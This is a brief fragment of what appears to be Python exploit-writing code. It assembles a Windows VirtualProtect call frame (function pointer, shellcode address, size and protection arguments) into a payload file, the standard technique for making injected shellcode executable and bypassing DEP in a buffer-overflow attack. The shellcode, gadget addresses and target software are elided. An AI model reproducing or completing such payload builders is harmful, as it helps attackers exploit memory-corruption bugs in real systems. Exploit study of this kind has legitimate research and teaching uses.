...
VirtualProtect_dwsize=b'\x57\x01\x00\x00'  #343 0x00000157
...
file.write(VirtualProtect);
file.write(shellcode_addr);
file.write(VirtualProtect_lpaddress);
file.write(VirtualProtect_dwsize);
file.write(VirtualProtect_flnewProtect);
file.write(VirtualProtect_floldprotect);
